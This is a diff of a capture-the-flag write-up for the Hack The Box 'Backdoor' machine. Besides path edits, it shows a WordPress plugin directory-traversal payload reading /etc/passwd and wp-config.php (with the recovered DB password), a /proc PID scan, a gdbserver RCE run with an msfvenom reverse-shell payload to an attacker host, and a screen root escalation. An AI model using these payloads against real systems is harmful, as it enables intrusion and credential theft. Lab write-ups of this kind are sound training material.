@@ -10,7 +10,7 @@
 - port 80 http service
 - port 1337 unknow ....waste?
 
-![](machine/backdoor/IMG/0.png)
+![](./IMG/0.png)
 
 ### Browse to web
 
@@ -33,7 +33,7 @@
 backdoor.htb
 ``` 
 
-![](machine/backdoor/IMG/1.png)
+![](./IMG/1.png)
 
 > I can know the blog site based on WordPress.
 ### dirb result
@@ -47,22 +47,24 @@ backdoor.htb
 2. /wp-includes
 3. /wp-admin
 
-![](machine/backdoor/IMG/2.png)
+![](./IMG/2.png)
+
 ### Browse the path
 
 >  Browse to /wp-admin will direct to /wp-login
 >  But I didn't find any credential from existing information, so I think it's impossible to use login.
 
-![](machine/backdoor/IMG/3.png)
+![](./IMG/3.png)
 
 > Browse to /wp-includes/, there are many wordpress source file, but I can't check the content by clicking the file.( all of them is empty file in that location)
 > I think the reason for that is the actual location not in here.
 
-![](machine/backdoor/IMG/4.png)
+![](./IMG/4.png)
 
 > Browse to /wp-content/, it should include a plugin directory (/wp-content/plugins), I just check it and found '**ebookdownload**' plugin. 
 
-![](machine/backdoor/IMG/5.png)
+![](./IMG/5.png)
+
 ## Exploitation
 
 ### WordPress Vulnerability 
@@ -74,7 +76,8 @@ backdoor.htb
     
 - [WordPress Vulnerability Database](https://patchstack.com/database/vulnerability/wordpress)
 
-![](machine/backdoor/IMG/6.png)
+![](./IMG/6.png)
+
 ### Plugin Vulnerability
 
     I find a Directory Traversal Vulnerability for ebookdownload.
@@ -87,7 +90,7 @@ backdoor.htb
     and it has a method can download the file.
     but the method doesn't do appropritate validation.
 
-![](machine/backdoor/IMG/7.png)
+![](./IMG/7.png)
 
 > So, let me use this vulnerability to read the file.
 > Payload
@@ -101,7 +104,8 @@ backdoor.htb
 ```
 # /wp-content/plugins/ebook-download/filedownloads?ebookdownloadurl=../../../../../../etc/passwd
 ```
-![](machine/backdoor/IMG/8.png)
+
+![](./IMG/8.png)
 
 2. Read /wp-config.php
 
@@ -109,12 +113,13 @@ backdoor.htb
 http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../wp-includes/wp-config.php
 ```
 
-![](machine/backdoor/IMG/9.png)
+![](./IMG/9.png)
 
 > DB_User : wordpressuser
 > DB_PASSWORD : MQYBJSaD#DxG6qbm
 
-![](machine/backdoor/IMG/10.png)
+![](./IMG/10.png)
+
 ### LFI to RCE 
 
 > But those file seems doesn't have too many help for now.
@@ -151,7 +156,7 @@ http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdown
 /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$pid$/cmdline
 ```
 
-![](machine/backdoor/IMG/11.png)
+![](./IMG/11.png)
 
 > And I finally find the PID 843 which execute a gdbserver on port 1337
 > This port number is that I can't know the service in the nmap result.
@@ -184,14 +189,15 @@ for x in range(0, 1000):
 
 ```
 
-![](machine/backdoor/IMG/12.png)
+![](./IMG/12.png)
 
 - [pid_scan code from write_up1](https://vato.cc/hackthebox-writeup-backdoor/)
 ### Exploit by gdbserver
 
 > First, find the cve for gdbserver
 
-![](machine/backdoor/IMG/13.png)
+![](./IMG/13.png)
+
 - [Exploit DB - GNU gdbServer 9.2](exploit-db.com/exploits/50539)
 - Payload
 ```
@@ -327,15 +333,16 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attack ip address> LPORT=4444 PrependFork=true -o /<path>/rev.bin
 ```
 
-![](machine/backdoor/IMG/14.png)
+![](./IMG/14.png)
+
 > Execute it...
 ```
 # python3 gdbserver_rce.py <victim ip> <reverse shell code>
 ```
 
-![](machine/backdoor/IMG/15.png)
+![](./IMG/15.png)
 
-![](machine/backdoor/IMG/16.png)
+![](./IMG/16.png)
 
 > Using nc to listen on port 4444
 > After the reverse shell connect, use python to upgrade the reverse shell to fully interactive TTY
@@ -344,7 +351,8 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 # python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](machine/backdoor/IMG/17.png)
+![](./IMG/17.png)
+
 ### Get user flag
 
 ```
@@ -353,7 +361,7 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 # cat user.txt
 ```
 
-![](machine/backdoor/IMG/18.png)
+![](./IMG/18.png)
 
 ```
 # ffd715967470d01507bd417ada815337
@@ -379,16 +387,16 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 
 > Linpeas Result
 
-![](machine/backdoor/IMG/19.png)
+![](./IMG/19.png)
 
 > Some cve we found 
 
-![](machine/backdoor/IMG/20.png)
+![](./IMG/20.png)
 
 > After I search, I tried the following 2 cve, but not success
 1. CVE-2021-4034 : pkexec 本地提权漏洞利用解析(pwnkit)
 
-![](machine/backdoor/IMG/21.png)
+![](./IMG/21.png)
     
 ```
     A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.
@@ -402,9 +410,9 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 > we focus on those process run by root
 > here are a screen be execute, and we also know the scree has cve be detected above
 
-![](machine/backdoor/IMG/22.png)
+![](./IMG/22.png)
 
-![](machine/backdoor/IMG/23.png)
+![](./IMG/23.png)
 
 > Now let's research more about 'screen' first
 
@@ -448,18 +456,20 @@ Attach to a not detached screen session. (Multi display mode).
 
 >  If we just attach screen directly, it will error.
 
-![](machine/backdoor/IMG/24.png)
+
+![](./IMG/24.png)
 
 > Here are some solution 
 - [Error: Screen - Please set a terminal type](https://nslu2-linux.yahoogroups.narkive.com/sgSspGkR/screen-please-set-a-terminal-type)
 
-![](machine/backdoor/IMG/25.png)
+![](./IMG/25.png)
 
-![](machine/backdoor/IMG/26.png)
+![](./IMG/26.png)
 
 >I think the 'vt100' is a terminal name, so I also can change to 'xterm' and other teraminal
 
-![](machine/backdoor/IMG/27.png)
+![](./IMG/27.png)
+
 ### Get root flag
 
 ```
@@ -468,7 +478,7 @@ Attach to a not detached screen session. (Multi display mode).
 # cat root.txt
 ```
 
-![](machine/backdoor/IMG/28.png)
+![](./IMG/28.png)
 
 > The root flag : ```# 0170133560c1744a07f7dda696be129a```
 ## Reference 
